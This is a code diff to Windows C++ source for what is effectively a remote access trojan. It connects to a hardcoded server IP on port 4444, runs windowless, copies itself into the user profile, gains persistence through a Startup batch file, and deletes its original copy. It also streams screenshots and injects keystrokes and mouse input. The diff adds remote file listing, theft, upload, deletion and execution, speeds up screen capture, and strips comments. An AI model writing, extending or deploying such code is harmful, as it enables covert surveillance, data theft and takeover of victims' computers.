@@ -8,6 +8,7 @@
 #include <endpointvolume.h>
 #include <propsys.h>
 #include <tlhelp32.h>
+#include <shellapi.h>
 #include <string>
 #include <thread>
 #include <fstream>
@@ -21,16 +22,13 @@
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "shell32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 const int PORT=4444;
-enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4 };
+enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4, CH_FILE=5 };
 
-// Default public IP used only the very first time server_ip.txt is created.
-// Edit %USERPROFILE%\server_ip.txt later if your public IP changes.
 static const char* DEFAULT_SERVER_IP = "94.28.233.146";
-
-// ---------- Path helpers (used for self-relocation + server_ip.txt) ----------
 
 static std::string GetUserProfileDir(){
     const char* up = getenv("USERPROFILE");
@@ -43,7 +41,6 @@ static std::string GetServerIpFilePath(){
     return GetUserProfileDir() + "\\server_ip.txt";
 }
 
-// Reads server IP from %USERPROFILE%\server_ip.txt, falls back to DEFAULT_SERVER_IP
 const char* GetServerIP(){
     static char ipBuf[64]={0};
     if(ipBuf[0]==0){
@@ -63,10 +60,6 @@ const char* GetServerIP(){
     return ipBuf;
 }
 
-// Copies this exe to %USERPROFILE%\nyxr.exe on first run, sets up server_ip.txt
-// and the Startup .bat, relaunches from the new location, and deletes the
-// original file. On subsequent runs (already in %USERPROFILE%) it just
-// makes sure server_ip.txt and the startup entry exist, then returns.
 void RelocateSelfIfNeeded(){
     char selfPathBuf[MAX_PATH]={0};
     GetModuleFileNameA(NULL, selfPathBuf, MAX_PATH);
@@ -79,10 +72,9 @@ void RelocateSelfIfNeeded(){
     bool alreadyInPlace = (_stricmp(fullSelf, fullTarget) == 0);
 
     if(!alreadyInPlace){
-        CopyFileA(fullSelf, fullTarget, FALSE); // FALSE = overwrite if exists
+        CopyFileA(fullSelf, fullTarget, FALSE);
     }
 
-    // Ensure server_ip.txt exists (don't clobber if the user already edited it)
     {
         std::string ipPath = GetServerIpFilePath();
         std::ifstream check(ipPath);
@@ -94,7 +86,6 @@ void RelocateSelfIfNeeded(){
         }
     }
 
-    // Always (re)write the startup entry so it survives reboots/crashes
     {
         std::string batPath = GetUserProfileDir() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
         std::ofstream bat(batPath);
@@ -103,7 +94,6 @@ void RelocateSelfIfNeeded(){
     }
 
     if(!alreadyInPlace){
-        // Launch the relocated copy
         {
             std::string launchCmd = "\"" + std::string(fullTarget) + "\"";
             std::vector<char> cmdBuf(launchCmd.begin(), launchCmd.end());
@@ -114,7 +104,6 @@ void RelocateSelfIfNeeded(){
             if(pi.hThread) CloseHandle(pi.hThread);
         }
 
-        // Schedule deletion of the original exe after this process exits
         {
             std::string delCmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + std::string(fullSelf) + "\"";
             std::vector<char> delBuf(delCmd.begin(), delCmd.end());
@@ -129,8 +118,6 @@ void RelocateSelfIfNeeded(){
         ExitProcess(0);
     }
 }
-
-// ---------- Everything below is unchanged except channel bytes ----------
 
 static const GUID s_SUBTYPE_FLOAT={0x00000003,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
 static const GUID s_SUBTYPE_PCM={0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
@@ -201,6 +188,67 @@ void SendDeviceList(){
     CoInitialize(0);IMMDeviceEnumerator*pE=NULL;CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);IMMDeviceCollection*pC=NULL;pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);UINT cnt=0;pC->GetCount(&cnt);int n=(int)cnt;SendAll(s,(char*)&n,4);for(int i=0;i<n;i++){IMMDevice*pD=NULL;pC->Item(i,&pD);IPropertyStore*pS=NULL;pD->OpenPropertyStore(STGM_READ,&pS);PROPVARIANT nm;ZeroMemory(&nm,sizeof(nm));pS->GetValue(s_PKEY_FriendlyName,&nm);char buf[256]={};if(nm.vt==VT_LPWSTR&&nm.pwszVal)WideCharToMultiByte(CP_ACP,0,nm.pwszVal,-1,buf,255,"?",NULL);int len=(int)strlen(buf);SendAll(s,(char*)&len,4);SendAll(s,buf,len);if(nm.vt==VT_LPWSTR&&nm.pwszVal)CoTaskMemFree(nm.pwszVal);pS->Release();pD->Release();}pC->Release();pE->Release();CoUninitialize();closesocket(s);
 }
 
+// --- NEW FILE MANAGER FUNCTIONS ---
+void SendFileListResponse(SOCKET s, const std::string& path) {
+    std::vector<std::pair<std::string, bool>> items;
+    std::vector<int64_t> sizes;
+    std::string search = path;
+    if (!search.empty() && search.back() != '\\') search += "\\";
+    search += "*";
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(search.c_str(), &fd);
+    if (h != INVALID_HANDLE_VALUE) {
+        do {
+            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
+            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
+            items.push_back({fd.cFileName, isDir});
+            int64_t sz = isDir ? 0 : ((int64_t)fd.nFileSizeHigh << 32 | fd.nFileSizeLow);
+            sizes.push_back(sz);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
+    int type = 0; SendAll(s, (char*)&type, 4);
+    int c = (int)items.size(); SendAll(s, (char*)&c, 4);
+    for (int i = 0; i < c; i++) {
+        int isDir = items[i].second ? 1 : 0; SendAll(s, (char*)&isDir, 4);
+        int nl = (int)items[i].first.size(); SendAll(s, (char*)&nl, 4);
+        if (nl > 0) SendAll(s, items[i].first.c_str(), nl);
+        SendAll(s, (char*)&sizes[i], 8);
+    }
+}
+
+void SendFileDownloadResponse(SOCKET s, const std::string& path) {
+    int type = 1; SendAll(s, (char*)&type, 4);
+    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        int64_t sz = -1; SendAll(s, (char*)&sz, 8); return;
+    }
+    LARGE_INTEGER li; GetFileSizeEx(hFile, &li);
+    int64_t sz = li.QuadPart; SendAll(s, (char*)&sz, 8);
+    char buf[65536]; DWORD read;
+    while (sz > 0) {
+        int toRead = (sz > sizeof(buf)) ? sizeof(buf) : (int)sz;
+        ReadFile(hFile, buf, toRead, &read, NULL);
+        if (read == 0) break;
+        SendAll(s, buf, read);
+        sz -= read;
+    }
+    CloseHandle(hFile);
+}
+
+void ReceiveFileUpload(SOCKET s, const std::string& path, int64_t size) {
+    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    char buf[65536];
+    while (size > 0) {
+        int toRead = (size > sizeof(buf)) ? sizeof(buf) : (int)size;
+        if (!RecvAll(s, buf, toRead)) break;
+        DWORD written; WriteFile(hFile, buf, toRead, &written, NULL);
+        size -= toRead;
+    }
+    CloseHandle(hFile);
+}
+
 void CommandListener(SOCKET s){
     while(g_Connected){
         char cmd;if(recv(s,&cmd,1,0)!=1)break;
@@ -220,6 +268,33 @@ void CommandListener(SOCKET s){
         else if(cmd=='k'){DWORD vk;char act;if(!RecvAll(s,(char*)&vk,4)||recv(s,&act,1,0)!=1)break;INPUT inp={};inp.type=INPUT_KEYBOARD;inp.ki.wVk=(WORD)vk;inp.ki.dwFlags=(act==1)?KEYEVENTF_KEYUP:0;SendInput(1,&inp,sizeof(INPUT));}
         else if(cmd=='w'){int delta;if(!RecvAll(s,(char*)&delta,4))break;INPUT inp={};inp.type=INPUT_MOUSE;inp.mi.dwFlags=MOUSEEVENTF_WHEEL;inp.mi.mouseData=(DWORD)delta;SendInput(1,&inp,sizeof(INPUT));}
         else if(cmd=='D'){int ml;if(!RecvAll(s,(char*)&ml,4))break;std::string msg;if(ml>0){std::vector<char>mb(ml);if(!RecvAll(s,mb.data(),ml))break;mb.push_back(0);msg=std::string(mb.data());}int nb;if(!RecvAll(s,(char*)&nb,4))break;g_DlgInfo.message=msg;g_DlgInfo.count=0;for(int i=0;i<nb&&i<3;i++){int bl;if(!RecvAll(s,(char*)&bl,4))break;std::string btn;if(bl>0){std::vector<char>bb(bl);if(!RecvAll(s,bb.data(),bl))break;bb.push_back(0);btn=std::string(bb.data());}g_DlgInfo.buttons[g_DlgInfo.count++]=btn;}std::thread([](){ShowDialogThread();}).detach();}
+        
+        // --- NEW FILE MANAGER COMMANDS ---
+        else if(cmd=='I'){
+            char sub; if(recv(s,&sub,1,0)!=1)break;
+            if(sub=='L'){
+                int pl; if(!RecvAll(s,(char*)&pl,4))break;
+                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
+                SendFileListResponse(s, path);
+            } else if(sub=='D'){
+                int pl; if(!RecvAll(s,(char*)&pl,4))break;
+                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
+                DeleteFileA(path.c_str());
+            } else if(sub=='O'){
+                int pl; if(!RecvAll(s,(char*)&pl,4))break;
+                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
+                ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
+            } else if(sub=='U'){
+                int pl; if(!RecvAll(s,(char*)&pl,4))break;
+                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
+                int64_t fsize; if(!RecvAll(s,(char*)&fsize,8))break;
+                ReceiveFileUpload(s, path, fsize);
+            } else if(sub=='W'){
+                int pl; if(!RecvAll(s,(char*)&pl,4))break;
+                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
+                SendFileDownloadResponse(s, path);
+            }
+        }
     }
     BlockInput(FALSE);
     g_Connected = false;
@@ -250,7 +325,14 @@ int main(){
             std::thread(CommandListener,sock).detach();
             while(g_Connected){
                 if(g_Active){
-                    HDC hS=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hS);HBITMAP bmp=CreateCompatibleBitmap(hS,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hS,0,0,SRCCOPY);IStream*strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);{Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jc,&eps);}SelectObject(mem,oldB);DeleteObject(bmp);DeleteDC(mem);ReleaseDC(NULL,hS);STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE*data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);delete[]data;if(!ok){g_Connected=false;break;}Sleep(150);
+                    HDC hS=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hS);HBITMAP bmp=CreateCompatibleBitmap(hS,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hS,0,0,SRCCOPY);SelectObject(mem,oldB);DeleteDC(mem);ReleaseDC(NULL,hS);
+                    IStream*strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);
+                    {Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jc,&eps);}
+                    DeleteObject(bmp);
+                    STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE*data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();
+                    bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);
+                    delete[]data;if(!ok){g_Connected=false;break;}
+                    Sleep(33); // Optimized from 150ms to ~30 FPS
                 } else {
                     Sleep(100);
                 }
